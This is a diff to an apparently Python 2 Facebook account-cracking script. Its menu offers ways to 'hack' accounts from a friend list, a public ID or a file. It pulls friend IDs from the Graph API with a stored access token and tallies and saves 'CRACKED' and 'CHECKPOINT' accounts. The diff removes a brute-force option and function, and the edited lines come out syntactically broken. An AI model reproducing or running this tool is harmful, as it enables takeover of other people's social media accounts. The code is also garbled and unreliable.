@@ -233,8 +233,7 @@ def super():
 	os.system('clear')
 	print logo
 	print "\033[33m[1] \033[91m══Hack From Friend List"
-	print "\033[33m[2] \033[91m══Hack From Public ID"
-	print "\033[33m[3] \033[91m══Hack Bruteforce"
+	print "\033[33m[2] \033[91m══Hack From Public 🆔"
 	print "\033[33m[4] \033[91m══Hack From File"
 	print "\033[33m[0] \033[91m══Back"
 	pilih_super()
@@ -270,12 +269,9 @@ def pilih_super():
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
-			id.append(i['id'])
-	elif peak =="3":
-		os.system('clear')
-		print logo
-		brute()	
-	elif peak =="4":
+			id.append(i['id']
+
+	        elif peak =="3":
 		os.system('clear')
 		print logo                  
 		try:
@@ -420,17 +416,8 @@ def pilih_super():
 	print "\033[1;32;40m[+] Total CRACKED/\x1b[1;93mCHECKPOINT \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
 	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
 	print """
-        raw_input("\n\033[5;52m[\033[5;53mExit\033[5;56
-super()
-def brute():
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;91m[!] Token not found'
-        os.system('rm -rf login.txt')
-        time.sleep(0.5)
-        login()
+        raw_input("\n\033[5;52m[\033[5;53mExit\033[5;56]
+        super()
     else:
         os.system('clear')
         print logo
